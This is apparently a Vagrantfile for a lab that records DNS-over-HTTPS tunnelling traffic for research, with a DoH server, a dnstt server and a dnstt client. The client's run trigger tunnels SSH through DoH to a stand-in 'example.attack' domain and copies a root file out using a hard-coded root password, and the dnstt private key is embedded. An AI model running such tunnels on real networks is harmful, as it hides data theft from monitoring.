@@ -1,0 +1,168 @@
+# -*- mode: ruby -*-
+# vi: set ft=ruby :
+
+Vagrant.configure("2") do |config|
+
+
+
+config.vm.define "dnsoverhttps" do |dnsoverhttps|
+
+    # Set the box-type and version (default is latest)
+    dnsoverhttps.vm.box = "ubuntu/focal64"
+    dnsoverhttps.vm.box_version = ">= 0"
+    
+    # Set the hostname
+    dnsoverhttps.vm.hostname = "dnsoverhttps"
+
+    # Setup networking
+    dnsoverhttps.vm.network "private_network", ip: "192.168.0.10", virtualbox__intnet: "intnet"
+    
+
+    # Provision VM
+    dnsoverhttps.vm.provision "shell", path: 'dns-over-https.bash', privileged: true
+    
+    dnsoverhttps.vm.provision "ansible_local" do |a|
+        a.install = true,
+        a.install_mode = "default",
+        a.playbook = "filebeat_playbook_dnsoverhttps",
+        a.become_user = "root",
+        a.become = true
+    end
+    # Runtime triggers
+    dnsoverhttps.trigger.after [:up, :reload] do |trigger|
+        trigger.info = "Begin TCPDUMP capture."
+        trigger.run_remote = { inline: 'rm -f nohup.out; nohup tcpdump -i any -s 0 -n -w /tmp/dns.pcap port 53 or port 443 or port 8053 & sleep 1; echo $! > /var/run/tcpdump.pid', privileged: true }
+    end
+    dnsoverhttps.trigger.after [:up, :reload] do |trigger|
+        trigger.info = "Executing 'run'-section of the scenario component."
+        trigger.run_remote = { inline: 'sudo systemctl stop systemd-resolved; sudo systemctl restart doh-server.service; sudo systemctl restart nginx.service; ', privileged: true }
+    end
+
+    # Data collection
+    
+    dnsoverhttps.trigger.before [:destroy, :halt, :reload] do |trigger|
+        trigger.info = "Stopping TCPDUMP"
+        trigger.run_remote = { inline: 'if [ -f /var/run/tcpdump.pid ]; then kill $(cat /var/run/tcpdump.pid); rm -f /var/run/tcpdump.pid; fi', privileged: true }
+    end
+    dnsoverhttps.trigger.before [:destroy, :halt, :reload] do |trigger|
+        trigger.info = "Changing permissions on the remote artifact: /var/log/nginx/dns.access.log"
+        trigger.run_remote = { inline: 'chmod o+r /var/log/nginx/dns.access.log', privileged: true }
+    end
+    dnsoverhttps.trigger.before [:destroy, :halt, :reload] do |trigger|
+        trigger.info = "Grabbing artifact from Guest machine: /var/log/nginx/dns.access.log"
+        trigger.run = { inline: 'vagrant scp dnsoverhttps:/var/log/nginx/dns.access.log dnsoverhttps/' }
+    end
+    dnsoverhttps.trigger.before [:destroy, :halt, :reload] do |trigger|
+        trigger.info = "Removing artifact from Guest machine: /var/log/nginx/dns.access.log"
+        trigger.run_remote = { inline: 'rm -rf /var/log/nginx/dns.access.log', privileged: true }
+    end
+    dnsoverhttps.trigger.before [:destroy, :halt, :reload] do |trigger|
+        trigger.info = "Changing permissions on the remote artifact: /var/log/doh-server.log"
+        trigger.run_remote = { inline: 'chmod o+r /var/log/doh-server.log', privileged: true }
+    end
+    dnsoverhttps.trigger.before [:destroy, :halt, :reload] do |trigger|
+        trigger.info = "Grabbing artifact from Guest machine: /var/log/doh-server.log"
+        trigger.run = { inline: 'vagrant scp dnsoverhttps:/var/log/doh-server.log dnsoverhttps/' }
+    end
+    dnsoverhttps.trigger.before [:destroy, :halt, :reload] do |trigger|
+        trigger.info = "Removing artifact from Guest machine: /var/log/doh-server.log"
+        trigger.run_remote = { inline: 'rm -rf /var/log/doh-server.log', privileged: true }
+    end
+    dnsoverhttps.trigger.before [:destroy, :halt, :reload] do |trigger|
+        trigger.info = "Changing permissions on the remote artifact: /tmp/filebeat.json*"
+        trigger.run_remote = { inline: 'chmod o+r /tmp/filebeat.json*', privileged: true }
+    end
+    dnsoverhttps.trigger.before [:destroy, :halt, :reload] do |trigger|
+        trigger.info = "Grabbing artifact from Guest machine: /tmp/filebeat.json*"
+        trigger.run = { inline: 'vagrant scp dnsoverhttps:/tmp/filebeat.json* dnsoverhttps/' }
+    end
+    dnsoverhttps.trigger.before [:destroy, :halt, :reload] do |trigger|
+        trigger.info = "Removing artifact from Guest machine: /tmp/filebeat.json*"
+        trigger.run_remote = { inline: 'rm -rf /tmp/filebeat.json*', privileged: true }
+    end
+    dnsoverhttps.trigger.before [:destroy, :halt, :reload] do |trigger|
+        trigger.info = "Changing permissions on the remote artifact: /tmp/dns.pcap"
+        trigger.run_remote = { inline: 'chmod o+r /tmp/dns.pcap', privileged: true }
+    end
+    dnsoverhttps.trigger.before [:destroy, :halt, :reload] do |trigger|
+        trigger.info = "Grabbing artifact from Guest machine: /tmp/dns.pcap"
+        trigger.run = { inline: 'vagrant scp dnsoverhttps:/tmp/dns.pcap dnsoverhttps/' }
+    end
+    dnsoverhttps.trigger.before [:destroy, :halt, :reload] do |trigger|
+        trigger.info = "Removing artifact from Guest machine: /tmp/dns.pcap"
+        trigger.run_remote = { inline: 'rm -rf /tmp/dns.pcap', privileged: true }
+    end
+    end
+config.vm.define "dnsttserver" do |dnsttserver|
+
+    # Set the box-type and version (default is latest)
+    dnsttserver.vm.box = "ubuntu/focal64"
+    dnsttserver.vm.box_version = ">= 0"
+    
+    # Set the hostname
+    dnsttserver.vm.hostname = "dnsttserver"
+
+    # Setup networking
+    dnsttserver.vm.network "private_network", ip: "192.168.0.20", virtualbox__intnet: "intnet"
+    
+
+    # Provision VM
+    dnsttserver.vm.provision "shell", path: 'dnstt_server_setup.bash', privileged: true
+    
+    # Runtime triggers
+    dnsttserver.trigger.after [:up, :reload] do |trigger|
+        trigger.info = "Executing 'run'-section of the scenario component."
+        trigger.run_remote = { inline: 'nohup asciinema rec /tmp/dnstt_server.cast -c \'set -x; /home/vagrant/dnstt/dnstt-server/dnstt-server -udp :53 -privkey d7ded13f8df25456cd365c7022c538a1341d74d918dc6f7aea64ce855e564345 example.attack 127.0.0.1:22 & sleep 1\'', privileged: true }
+    end
+
+    # Data collection
+    dnsttserver.trigger.before [:destroy, :halt, :reload] do |trigger|
+        trigger.info = "Changing permissions on the remote artifact: /tmp/*.cast"
+        trigger.run_remote = { inline: 'chmod o+r /tmp/*.cast', privileged: true }
+    end
+    dnsttserver.trigger.before [:destroy, :halt, :reload] do |trigger|
+        trigger.info = "Grabbing artifact from Guest machine: /tmp/*.cast"
+        trigger.run = { inline: 'vagrant scp dnsttserver:/tmp/*.cast dnsttserver/' }
+    end
+    dnsttserver.trigger.before [:destroy, :halt, :reload] do |trigger|
+        trigger.info = "Removing artifact from Guest machine: /tmp/*.cast"
+        trigger.run_remote = { inline: 'rm -rf /tmp/*.cast', privileged: true }
+    end
+    end
+config.vm.define "dnsttclient" do |dnsttclient|
+
+    # Set the box-type and version (default is latest)
+    dnsttclient.vm.box = "ubuntu/focal64"
+    dnsttclient.vm.box_version = ">= 0"
+    
+    # Set the hostname
+    dnsttclient.vm.hostname = "dnsttclient"
+
+    # Setup networking
+    dnsttclient.vm.network "private_network", ip: "192.168.0.30", virtualbox__intnet: "intnet"
+    
+
+    # Provision VM
+    dnsttclient.vm.provision "shell", path: 'dnstt_client_setup.bash', privileged: true
+    
+    # Runtime triggers
+    dnsttclient.trigger.after [:up, :reload] do |trigger|
+        trigger.info = "Executing 'run'-section of the scenario component."
+        trigger.run_remote = { inline: 'asciinema rec /tmp/dnstt_client_Chrome_62.cast -c \'set -x; /home/vagrant/dnstt/dnstt-client/dnstt-client -doh https://192.168.0.10/dns-query -utls Chrome_62 -pubkey b6fcced3162ecc334fcb49a3dc6b094c542fa071d24bf6cab890820f893a5b56 example.attack 127.0.0.1:7000 & sleep 1; rsync -P --rsh="sshpass -p root ssh -l root -oStrictHostKeyChecking=no -p 7000" 127.0.0.1:/root/test-file /tmp/;\'', privileged: true }
+    end
+
+    # Data collection
+    dnsttclient.trigger.before [:destroy, :halt, :reload] do |trigger|
+        trigger.info = "Changing permissions on the remote artifact: /tmp/*.cast"
+        trigger.run_remote = { inline: 'chmod o+r /tmp/*.cast', privileged: true }
+    end
+    dnsttclient.trigger.before [:destroy, :halt, :reload] do |trigger|
+        trigger.info = "Grabbing artifact from Guest machine: /tmp/*.cast"
+        trigger.run = { inline: 'vagrant scp dnsttclient:/tmp/*.cast dnsttclient/' }
+    end
+    dnsttclient.trigger.before [:destroy, :halt, :reload] do |trigger|
+        trigger.info = "Removing artifact from Guest machine: /tmp/*.cast"
+        trigger.run_remote = { inline: 'rm -rf /tmp/*.cast', privileged: true }
+    end
+    end
+end
